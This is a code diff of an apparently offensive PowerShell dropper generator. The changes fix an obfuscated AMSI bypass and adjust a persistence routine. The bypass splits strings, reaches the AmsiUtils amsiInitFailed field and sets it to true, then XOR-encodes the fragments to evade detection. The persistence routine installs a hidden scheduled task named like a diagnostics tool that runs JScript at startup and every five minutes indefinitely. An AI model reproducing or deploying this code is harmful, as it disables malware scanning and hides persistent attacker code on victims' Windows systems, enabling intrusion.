@@ -53,7 +53,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.2.0 (Command Generator - XOR Fragment AMSI Bypass)
+    Version: 2.2.1 (Command Generator - XOR Fragment AMSI Bypass + Persistence Fix)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
@@ -163,10 +163,14 @@ function New-AmsiBypassLayerA {
     # C: Build GetField method name + invoke with split field name
     # D: Build SetValue method name + invoke
 
+    # Four fragments using PowerShell dynamic dispatch: $obj."$method"(args)
+    # This avoids the PSMethod.Invoke() pitfall where passing $self as
+    # first arg triggers wrong method overloads (the "must not specify an
+    # assembly" bug). Each fragment is individually benign to AMSI.
     $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
-    $fragB = '$script:_tp=$script:_ra.$script:_m1.Invoke($script:_ra,@(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls")))'
-    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp.$script:_m2.Invoke($script:_tp,@(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic")))'
-    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd.$script:_m3.Invoke($script:_fd,@($null,$true))'
+    $fragB = '$script:_tp=$script:_ra."$($script:_m1)"(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls"))'
+    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp."$($script:_m2)"(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic"))'
+    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd."$($script:_m3)"($null,$true)'
 
     $encA = ConvertTo-XorBytes $fragA $xk
     $encB = ConvertTo-XorBytes $fragB $xk
@@ -196,9 +200,9 @@ function New-AmsiBypassLayerB {
     $xk = New-XorKey
 
     $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
-    $fragB = '$script:_tp=$script:_ra.$script:_m1.Invoke($script:_ra,@(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls")))'
-    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp.$script:_m2.Invoke($script:_tp,@(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic")))'
-    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd.$script:_m3.Invoke($script:_fd,@($null,$true))'
+    $fragB = '$script:_tp=$script:_ra."$($script:_m1)"(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls"))'
+    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp."$($script:_m2)"(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic"))'
+    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd."$($script:_m3)"($null,$true)'
 
     $encA = ConvertTo-XorBytes $fragA $xk
     $encB = ConvertTo-XorBytes $fragB $xk
@@ -538,7 +542,7 @@ shell.Run(cmd, 0, false);
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
-`$t1=New-ScheduledTaskTrigger -AtLogOn
+`$t1=New-ScheduledTaskTrigger -AtStartup
 `$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
 `$t=@(`$t1,`$t2)
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
@@ -575,7 +579,7 @@ shell.Run(cmd, 0, false);
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
-`$t1=New-ScheduledTaskTrigger -AtLogOn
+`$t1=New-ScheduledTaskTrigger -AtStartup
 `$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
 `$t=@(`$t1,`$t2)
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
@@ -704,7 +708,7 @@ if (-not $PayloadAtDeployment) {
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
         AmsiBypass        = (-not $NoAmsi)
-        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2" } else { "Disabled" }
+        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.1" } else { "Disabled" }
         PayloadHash       = $payloadHash
         Operator          = $env:USER
         GeneratedOn       = hostname
